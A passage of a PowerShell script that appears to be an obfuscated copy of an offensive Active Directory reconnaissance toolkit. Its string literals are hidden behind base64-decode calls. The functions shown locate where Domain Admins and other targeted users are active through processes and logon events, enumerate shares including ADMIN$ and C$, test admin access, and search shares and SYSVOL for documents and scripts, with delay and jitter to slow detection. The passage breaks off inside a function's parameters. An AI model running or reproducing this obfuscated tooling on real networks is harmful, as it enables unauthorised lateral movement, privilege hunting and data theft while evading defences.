                    $Processes = Get-NetProcess -ComputerName $ComputerName -ErrorAction SilentlyContinue
                }

                ForEach ($Process in $Processes) {
                    
                    if($ProcessName) {
                        $ProcessName.split(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("LA==")))) | ForEach-Object {
                            if ($Process.ProcessName -match $_) {
                                $Process
                            }
                        }
                    }
                    
                    elseif ($TargetUsers -contains $Process.User) {
                        $Process
                    }
                }
            }
        }

    }

    process {

        if($Threads) {
            Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNpbmcgdGhyZWFkaW5nIHdpdGggdGhyZWFkcyA9ICRUaHJlYWRz")))

            
            $ScriptParams = @{
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UGluZw=="))) = $(-not $NoPing)
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJvY2Vzc05hbWU="))) = $ProcessName
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VGFyZ2V0VXNlcnM="))) = $TargetUsers
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVtb3RlVXNlck5hbWU="))) = $RemoteUserName
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVtb3RlUGFzc3dvcmQ="))) = $RemotePassword
            }

            
            Invoke-ThreadedFunction -ComputerName $ComputerName -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams
        }

        else {
            if(-not $NoPing -and ($ComputerName.count -ne 1)) {
                
                $Ping = {param($ComputerName) if(Test-Connection -ComputerName $ComputerName -Count 1 -Quiet -ErrorAction Stop){$ComputerName}}
                $ComputerName = Invoke-ThreadedFunction -NoImports -ComputerName $ComputerName -ScriptBlock $Ping -Threads 100
            }

            Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("WypdIFRvdGFsIG51bWJlciBvZiBhY3RpdmUgaG9zdHM6IHswfQ=="))) -f $($ComputerName.count))
            $Counter = 0

            ForEach ($Computer in $ComputerName) {

                $Counter = $Counter + 1

                
                Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)

                Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("WypdIEVudW1lcmF0aW5nIHNlcnZlciAkQ29tcHV0ZXIgKCRDb3VudGVyIG9mIHswfSk="))) -f $($ComputerName.count))
                $Result = Invoke-Command -ScriptBlock $HostEnumBlock -ArgumentList $Computer, $False, $ProcessName, $TargetUsers, $RemoteUserName, $RemotePassword
                $Result

                if($Result -and $StopOnSuccess) {
                    Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("WypdIFRhcmdldCB1c2VyL3Byb2Nlc3MgZm91bmQsIHJldHVybmluZyBlYXJseQ==")))
                    return
                }
            }
        }

    }
}


function Invoke-EventHunter {


    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$True)]
        [Alias('Hosts')]
        [String[]]
        $ComputerName,

        [ValidateScript({Test-Path -Path $_ })]
        [Alias('HostList')]
        [String]
        $ComputerFile,

        [String]
        $ComputerFilter,

        [String]
        $ComputerADSpath,

        [String]
        $GroupName = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWluIEFkbWlucw=="))),

        [String]
        $TargetServer,

        [String]
        $UserName,

        [String]
        $UserFilter,

        [String]
        $UserADSpath,

        [ValidateScript({Test-Path -Path $_ })]
        [String]
        $UserFile,

        [String]
        $Domain,

        [String]
        $DomainController,

        [Int32]
        $SearchDays = 3,

        [Switch]
        $SearchForest,

        [ValidateRange(1,100)] 
        [Int]
        $Threads
    )

    begin {

        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RGVidWc=")))]) {
            $DebugPreference = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29udGludWU=")))
        }

        
        $RandNo = New-Object System.Random

        Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("WypdIFJ1bm5pbmcgSW52b2tlLUV2ZW50SHVudGVy")))

        if($Domain) {
            $TargetDomains = @($Domain)
        }
        elseif($SearchForest) {
            
            $TargetDomains = Get-NetForestDomain | ForEach-Object { $_.Name }
        }
        else {
            
            $TargetDomains = @( (Get-NetDomain).name )
        }

        
        
        
        
        

        if(!$ComputerName) { 
            
            if($ComputerFile) {
                $ComputerName = Get-Content -Path $ComputerFile
            }
            elseif($ComputerFilter -or $ComputerADSpath) {
                [array]$ComputerName = @()
                ForEach ($Domain in $TargetDomains) {
                    Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("WypdIFF1ZXJ5aW5nIGRvbWFpbiAkRG9tYWluIGZvciBob3N0cw==")))
                    $ComputerName += Get-NetComputer -Domain $Domain -DomainController $DomainController -Filter $ComputerFilter -ADSpath $ComputerADSpath
                }
            }
            else {
                
                [array]$ComputerName = @()
                ForEach ($Domain in $TargetDomains) {
                    Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("WypdIFF1ZXJ5aW5nIGRvbWFpbiAkRG9tYWluIGZvciBkb21haW4gY29udHJvbGxlcnM=")))
                    $ComputerName += Get-NetDomainController -LDAP -Domain $Domain -DomainController $DomainController | ForEach-Object { $_.dnshostname}
                }
            }

            
            $ComputerName = $ComputerName | Where-Object { $_ } | Sort-Object -Unique | Sort-Object { Get-Random }
            if($($ComputerName.Count) -eq 0) {
                throw ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Tm8gaG9zdHMgZm91bmQh")))
            }
        }

        
        
        
        
        

        
        $TargetUsers = @()

        
        if($TargetServer) {
            Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UXVlcnlpbmcgdGFyZ2V0IHNlcnZlciAnJFRhcmdldFNlcnZlcicgZm9yIGxvY2FsIHVzZXJz")))
            $TargetUsers = Get-NetLocalGroup $TargetServer -Recurse | Where-Object {(-not $_.IsGroup) -and $_.IsDomain } | ForEach-Object {
                ($_.AccountName).split(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Lw=="))))[1].toLower()
            }  | Where-Object {$_}
        }
        
        elseif($UserName) {
            Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("WypdIFVzaW5nIHRhcmdldCB1c2VyICckVXNlck5hbWUnLi4u")))
            $TargetUsers = @( $UserName.ToLower() )
        }
        
        elseif($UserFile) {
            $TargetUsers = Get-Content -Path $UserFile | Where-Object {$_}
        }
        elseif($UserADSpath -or $UserFilter) {
            ForEach ($Domain in $TargetDomains) {
                Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("WypdIFF1ZXJ5aW5nIGRvbWFpbiAkRG9tYWluIGZvciB1c2Vycw==")))
                $TargetUsers += Get-NetUser -Domain $Domain -DomainController $DomainController -ADSpath $UserADSpath -Filter $UserFilter | ForEach-Object {
                    $_.samaccountname
                }  | Where-Object {$_}
            }            
        }
        else {
            ForEach ($Domain in $TargetDomains) {
                Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("WypdIFF1ZXJ5aW5nIGRvbWFpbiAkRG9tYWluIGZvciB1c2VycyBvZiBncm91cCAnJEdyb3VwTmFtZQ==")))
                $TargetUsers += Get-NetGroupMember -GroupName $GroupName -Domain $Domain -DomainController $DomainController | Foreach-Object {
                    $_.MemberName
                }
            }
        }

        if (((!$TargetUsers) -or ($TargetUsers.Count -eq 0))) {
            throw ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("WyFdIE5vIHVzZXJzIGZvdW5kIHRvIHNlYXJjaCBmb3Ih")))
        }

        
        $HostEnumBlock = {
            param($ComputerName, $Ping, $TargetUsers, $SearchDays)

            
            $Up = $True
            if($Ping) {
                $Up = Test-Connection -Count 1 -Quiet -ComputerName $ComputerName
            }
            if($Up) {
                
                Get-UserEvent -ComputerName $ComputerName -EventType ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("YWxs"))) -DateStart ([DateTime]::Today.AddDays(-$SearchDays)) | Where-Object {
                    
                    $TargetUsers -contains $_.UserName
                }
            }
        }

    }

    process {

        if($Threads) {
            Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNpbmcgdGhyZWFkaW5nIHdpdGggdGhyZWFkcyA9ICRUaHJlYWRz")))

            
            $ScriptParams = @{
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UGluZw=="))) = $(-not $NoPing)
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VGFyZ2V0VXNlcnM="))) = $TargetUsers
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoRGF5cw=="))) = $SearchDays
            }

            
            Invoke-ThreadedFunction -ComputerName $ComputerName -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams
        }

        else {
            if(-not $NoPing -and ($ComputerName.count -ne 1)) {
                
                $Ping = {param($ComputerName) if(Test-Connection -ComputerName $ComputerName -Count 1 -Quiet -ErrorAction Stop){$ComputerName}}
                $ComputerName = Invoke-ThreadedFunction -NoImports -ComputerName $ComputerName -ScriptBlock $Ping -Threads 100
            }

            Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("WypdIFRvdGFsIG51bWJlciBvZiBhY3RpdmUgaG9zdHM6IHswfQ=="))) -f $($ComputerName.count))
            $Counter = 0

            ForEach ($Computer in $ComputerName) {

                $Counter = $Counter + 1

                
                Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)

                Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("WypdIEVudW1lcmF0aW5nIHNlcnZlciAkQ29tcHV0ZXIgKCRDb3VudGVyIG9mIHswfSk="))) -f $($ComputerName.count))
                Invoke-Command -ScriptBlock $HostEnumBlock -ArgumentList $Computer, $(-not $NoPing), $TargetUsers, $SearchDays
            }
        }

    }
}


function Invoke-ShareFinder {


    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$True)]
        [Alias('Hosts')]
        [String[]]
        $ComputerName,

        [ValidateScript({Test-Path -Path $_ })]
        [Alias('HostList')]
        [String]
        $ComputerFile,

        [String]
        $ComputerFilter,

        [String]
        $ComputerADSpath,

        [Switch]
        $ExcludeStandard,

        [Switch]
        $ExcludePrint,

        [Switch]
        $ExcludeIPC,

        [Switch]
        $NoPing,

        [Switch]
        $CheckShareAccess,

        [Switch]
        $CheckAdmin,

        [UInt32]
        $Delay = 0,

        [Double]
        $Jitter = .3,

        [String]
        $Domain,

        [String]
        $DomainController,
 
        [Switch]
        $SearchForest,

        [ValidateRange(1,100)] 
        [Int]
        $Threads
    )

    begin {
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RGVidWc=")))]) {
            $DebugPreference = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29udGludWU=")))
        }

        
        $RandNo = New-Object System.Random

        Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("WypdIFJ1bm5pbmcgSW52b2tlLVNoYXJlRmluZGVyIHdpdGggZGVsYXkgb2YgJERlbGF5")))

        
        [String[]] $ExcludedShares = @('')

        if ($ExcludePrint) {
            $ExcludedShares = $ExcludedShares + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UFJJTlQk")))
        }
        if ($ExcludeIPC) {
            $ExcludedShares = $ExcludedShares + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SVBDJA==")))
        }
        if ($ExcludeStandard) {
            $ExcludedShares = @('', ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QURNSU4k"))), ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SVBDJA=="))), ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QyQ="))), ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UFJJTlQk"))))
        }

        if(!$ComputerName) { 

            if($Domain) {
                $TargetDomains = @($Domain)
            }
            elseif($SearchForest) {
                
                $TargetDomains = Get-NetForestDomain | ForEach-Object { $_.Name }
            }
            else {
                
                $TargetDomains = @( (Get-NetDomain).name )
            }

            
            if($ComputerFile) {
                $ComputerName = Get-Content -Path $ComputerFile
            }
            else {
                [array]$ComputerName = @()
                ForEach ($Domain in $TargetDomains) {
                    Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("WypdIFF1ZXJ5aW5nIGRvbWFpbiAkRG9tYWluIGZvciBob3N0cw==")))
                    $ComputerName += Get-NetComputer -Domain $Domain -DomainController $DomainController -Filter $ComputerFilter -ADSpath $ComputerADSpath
                }
            }

            
            $ComputerName = $ComputerName | Where-Object { $_ } | Sort-Object -Unique | Sort-Object { Get-Random }
            if($($ComputerName.count) -eq 0) {
                throw ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Tm8gaG9zdHMgZm91bmQh")))
            }
        }

        
        $HostEnumBlock = {
            param($ComputerName, $Ping, $CheckShareAccess, $ExcludedShares, $CheckAdmin)

            
            $Up = $True
            if($Ping) {
                $Up = Test-Connection -Count 1 -Quiet -ComputerName $ComputerName
            }
            if($Up) {
                
                $Shares = Get-NetShare -ComputerName $ComputerName
                ForEach ($Share in $Shares) {
                    Write-Debug ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("WypdIFNlcnZlciBzaGFyZTogJFNoYXJl")))
                    $NetName = $Share.shi1_netname
                    $Remark = $Share.shi1_remark
                    $Path = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XFw=")))+$ComputerName+([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XA==")))+$NetName

                    
                    if (($NetName) -and ($NetName.trim() -ne '')) {
                        
                        if($CheckAdmin) {
                            if($NetName.ToUpper() -eq ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QURNSU4k")))) {
                                try {
                                    $Null = [IO.Directory]::GetFiles($Path)
                                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XFwkQ29tcHV0ZXJOYW1lXCROZXROYW1lIA=="))) + "`t" + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("LSAkUmVtYXJr")))
                                }
                                catch {
                                    Write-Debug (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RXJyb3IgYWNjZXNzaW5nIHBhdGggJFBhdGggOiB7MH0="))) -f $_)
                                }
                            }
                        }
                        
                        elseif ($ExcludedShares -NotContains $NetName.ToUpper()) {
                            
                            if($CheckShareAccess) {
                                
                                try {
                                    $Null = [IO.Directory]::GetFiles($Path)
                                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XFwkQ29tcHV0ZXJOYW1lXCROZXROYW1lIA=="))) + "`t" + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("LSAkUmVtYXJr")))
                                }
                                catch {
                                    Write-Debug (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RXJyb3IgYWNjZXNzaW5nIHBhdGggJFBhdGggOiB7MH0="))) -f $_)
                                }
                            }
                            else {
                                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XFwkQ29tcHV0ZXJOYW1lXCROZXROYW1lIA=="))) + "`t" + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("LSAkUmVtYXJr")))
                            }
                        }
                    }
                }
            }
        }

    }

    process {

        if($Threads) {
            Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNpbmcgdGhyZWFkaW5nIHdpdGggdGhyZWFkcyA9ICRUaHJlYWRz")))

            
            $ScriptParams = @{
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UGluZw=="))) = $(-not $NoPing)
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q2hlY2tTaGFyZUFjY2Vzcw=="))) = $CheckShareAccess
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RXhjbHVkZWRTaGFyZXM="))) = $ExcludedShares
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q2hlY2tBZG1pbg=="))) = $CheckAdmin
            }

            
            Invoke-ThreadedFunction -ComputerName $ComputerName -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams
        }

        else {
            if(-not $NoPing -and ($ComputerName.count -ne 1)) {
                
                $Ping = {param($ComputerName) if(Test-Connection -ComputerName $ComputerName -Count 1 -Quiet -ErrorAction Stop){$ComputerName}}
                $ComputerName = Invoke-ThreadedFunction -NoImports -ComputerName $ComputerName -ScriptBlock $Ping -Threads 100
            }

            Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("WypdIFRvdGFsIG51bWJlciBvZiBhY3RpdmUgaG9zdHM6IHswfQ=="))) -f $($ComputerName.count))
            $Counter = 0

            ForEach ($Computer in $ComputerName) {

                $Counter = $Counter + 1

                
                Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)

                Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("WypdIEVudW1lcmF0aW5nIHNlcnZlciAkQ29tcHV0ZXIgKCRDb3VudGVyIG9mIHswfSk="))) -f $($ComputerName.count))
                Invoke-Command -ScriptBlock $HostEnumBlock -ArgumentList $Computer, $False, $CheckShareAccess, $ExcludedShares, $CheckAdmin
            }
        }
        
    }
}


function Invoke-FileFinder {


    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$True)]
        [Alias('Hosts')]
        [String[]]
        $ComputerName,

        [ValidateScript({Test-Path -Path $_ })]
        [Alias('HostList')]
        [String]
        $ComputerFile,

        [String]
        $ComputerFilter,

        [String]
        $ComputerADSpath,

        [ValidateScript({Test-Path -Path $_ })]
        [String]
        $ShareList,

        [Switch]
        $OfficeDocs,

        [Switch]
        $FreshEXEs,

        [String[]]
        $Terms,

        [ValidateScript({Test-Path -Path $_ })]
        [String]
        $TermList,

        [String]
        $LastAccessTime,

        [String]
        $LastWriteTime,

        [String]
        $CreationTime,

        [Switch]
        $IncludeC,

        [Switch]
        $IncludeAdmin,

        [Switch]
        $ExcludeFolders,

        [Switch]
        $ExcludeHidden,

        [Switch]
        $CheckWriteAccess,

        [String]
        $OutFile,

        [Switch]
        $NoClobber,

        [Switch]
        $NoPing,

        [UInt32]
        $Delay = 0,

        [Double]
        $Jitter = .3,

        [String]
        $Domain,

        [String]
        $DomainController,
        
        [Switch]
        $SearchForest,

        [Switch]
        $SearchSYSVOL,

        [ValidateRange(1,100)] 
        [Int]
        $Threads,

        [Switch]
        $UsePSDrive,

        [System.Management.Automation.PSCredential]
        $Credential = [System.Management.Automation.PSCredential]::Empty
    )

    begin {
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RGVidWc=")))]) {
            $DebugPreference = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29udGludWU=")))
        }

        
        $RandNo = New-Object System.Random

        Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("WypdIFJ1bm5pbmcgSW52b2tlLUZpbGVGaW5kZXIgd2l0aCBkZWxheSBvZiAkRGVsYXk=")))

        $Shares = @()

        
        [String[]] $ExcludedShares = @(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QyQ="))), ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QURNSU4k"))))

        
        if ($IncludeC) {
            if ($IncludeAdmin) {
                $ExcludedShares = @()
            }
            else {
                $ExcludedShares = @(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QURNSU4k"))))
            }
        }

        if ($IncludeAdmin) {
            if ($IncludeC) {
                $ExcludedShares = @()
            }
            else {
                $ExcludedShares = @(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QyQ="))))
            }
        }

        
        if(!$NoClobber) {
            if ($OutFile -and (Test-Path -Path $OutFile)) { Remove-Item -Path $OutFile }
        }

        
        if ($TermList) {
            ForEach ($Term in Get-Content -Path $TermList) {
                if (($Term -ne $Null) -and ($Term.trim() -ne '')) {
                    $Terms += $Term
                }
            }
        }

        if($Domain) {
            $TargetDomains = @($Domain)
        }
        elseif($SearchForest) {
            
            $TargetDomains = Get-NetForestDomain | ForEach-Object { $_.Name }
        }
        else {
            
            $TargetDomains = @( (Get-NetDomain).name )
        }

        
        if($ShareList) {
            ForEach ($Item in Get-Content -Path $ShareList) {
                if (($Item -ne $Null) -and ($Item.trim() -ne '')) {
                    
                    $Share = $Item.Split("" + "`t" + "")[0]
                    $Shares += $Share
                }
            }
        }
        if($SearchSYSVOL) {
            ForEach ($Domain in $TargetDomains) {
                $DCSearchPath = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XFwkRG9tYWluXFNZU1ZPTFw=")))
                Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("WypdIEFkZGluZyBzaGFyZSBzZWFyY2ggcGF0aCAkRENTZWFyY2hQYXRo")))
                $Shares += $DCSearchPath
            }
            if(!$Terms) {
                
                $Terms = @(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("LnZicw=="))), ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("LmJhdA=="))), ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("LnBzMQ=="))))
            }
        }
        else {
            
            if($ComputerFile) {
                $ComputerName = Get-Content -Path $ComputerFile
            }
            else {
                [array]$ComputerName = @()
                ForEach ($Domain in $TargetDomains) {
                    Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("WypdIFF1ZXJ5aW5nIGRvbWFpbiAkRG9tYWluIGZvciBob3N0cw==")))
                    $ComputerName += Get-NetComputer -Filter $ComputerFilter -ADSpath $ComputerADSpath -Domain $Domain -DomainController $DomainController
                }
            }

            
            $ComputerName = $ComputerName | Where-Object { $_ } | Sort-Object -Unique | Sort-Object { Get-Random }
            if($($ComputerName.Count) -eq 0) {
                throw ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Tm8gaG9zdHMgZm91bmQh")))
            }
        }

        
        $HostEnumBlock = {
            param($ComputerName, $Ping, $ExcludedShares, $Terms, $ExcludeFolders, $OfficeDocs, $ExcludeHidden, $FreshEXEs, $CheckWriteAccess, $OutFile, $UsePSDrive, $Credential)

            Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJOYW1lOiAkQ29tcHV0ZXJOYW1l")))
            Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RXhjbHVkZWRTaGFyZXM6ICRFeGNsdWRlZFNoYXJlcw==")))
            $SearchShares = @()

            if($ComputerName.StartsWith(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XFw="))))) {
                
                $SearchShares += $ComputerName
            }
            else {
                
                $Up = $True
                if($Ping) {
                    $Up = Test-Connection -Count 1 -Quiet -ComputerName $ComputerName
                }
                if($Up) {
                    
                    $Shares = Get-NetShare -ComputerName $ComputerName
                    ForEach ($Share in $Shares) {

                        $NetName = $Share.shi1_netname
                        $Path = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XFw=")))+$ComputerName+([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XA==")))+$NetName

                        
                        if (($NetName) -and ($NetName.trim() -ne '')) {

                            
                            if ($ExcludedShares -NotContains $NetName.ToUpper()) {
                                
                                try {
                                    $Null = [IO.Directory]::GetFiles($Path)
                                    $SearchShares += $Path
                                }
                                catch {
                                    Write-Debug ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("WyFdIE5vIGFjY2VzcyB0byAkUGF0aA==")))
                                }
                            }
                        }
                    }
                }
            }

            ForEach($Share in $SearchShares) {
                $SearchArgs =  @{
                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UGF0aA=="))) = $Share
                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VGVybXM="))) = $Terms
                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("T2ZmaWNlRG9jcw=="))) = $OfficeDocs
                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RnJlc2hFWEVz"))) = $FreshEXEs
                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TGFzdEFjY2Vzc1RpbWU="))) = $LastAccessTime
                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TGFzdFdyaXRlVGltZQ=="))) = $LastWriteTime
                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlYXRpb25UaW1l"))) = $CreationTime
                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RXhjbHVkZUZvbGRlcnM="))) = $ExcludeFolders
                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RXhjbHVkZUhpZGRlbg=="))) = $ExcludeHidden
                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q2hlY2tXcml0ZUFjY2Vzcw=="))) = $CheckWriteAccess
                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("T3V0RmlsZQ=="))) = $OutFile
                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlUFNEcml2ZQ=="))) = $UsePSDrive
                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA=="))) = $Credential
                }

                Find-InterestingFile @SearchArgs
            }
        }
    }

    process {

        if($Threads) {
            Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNpbmcgdGhyZWFkaW5nIHdpdGggdGhyZWFkcyA9ICRUaHJlYWRz")))

            
            $ScriptParams = @{
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UGluZw=="))) = $(-not $NoPing)
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RXhjbHVkZWRTaGFyZXM="))) = $ExcludedShares
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VGVybXM="))) = $Terms
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RXhjbHVkZUZvbGRlcnM="))) = $ExcludeFolders
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("T2ZmaWNlRG9jcw=="))) = $OfficeDocs
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RXhjbHVkZUhpZGRlbg=="))) = $ExcludeHidden
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RnJlc2hFWEVz"))) = $FreshEXEs
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q2hlY2tXcml0ZUFjY2Vzcw=="))) = $CheckWriteAccess
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("T3V0RmlsZQ=="))) = $OutFile
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlUFNEcml2ZQ=="))) = $UsePSDrive
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA=="))) = $Credential
            }

            
            if($Shares) {
                
                Invoke-ThreadedFunction -ComputerName $Shares -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams
            }
            else {
                Invoke-ThreadedFunction -ComputerName $ComputerName -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams
            }        
        }

        else {
            if($Shares){
                $ComputerName = $Shares
            }
            elseif(-not $NoPing -and ($ComputerName.count -gt 1)) {
                
                $Ping = {param($ComputerName) if(Test-Connection -ComputerName $ComputerName -Count 1 -Quiet -ErrorAction Stop){$ComputerName}}
                $ComputerName = Invoke-ThreadedFunction -NoImports -ComputerName $ComputerName -ScriptBlock $Ping -Threads 100
            }

            Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("WypdIFRvdGFsIG51bWJlciBvZiBhY3RpdmUgaG9zdHM6IHswfQ=="))) -f $($ComputerName.count))
            $Counter = 0

            $ComputerName | Where-Object {$_} | ForEach-Object {
                Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXI6IHswfQ=="))) -f $_)
                $Counter = $Counter + 1

                
                Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)

                Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("WypdIEVudW1lcmF0aW5nIHNlcnZlciB7MX0gKCRDb3VudGVyIG9mIHswfSk="))) -f $($ComputerName.count), $_)

                Invoke-Command -ScriptBlock $HostEnumBlock -ArgumentList $_, $False, $ExcludedShares, $Terms, $ExcludeFolders, $OfficeDocs, $ExcludeHidden, $FreshEXEs, $CheckWriteAccess, $OutFile, $UsePSDrive, $Credential                
            }
        }
    }
}


function Find-LocalAdminAccess {


    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$True)]
        [Alias('Hosts')]
        [String[]]
        $ComputerName,

        [ValidateScript({Test-Path -Path $_ })]
        [Alias('HostList')]
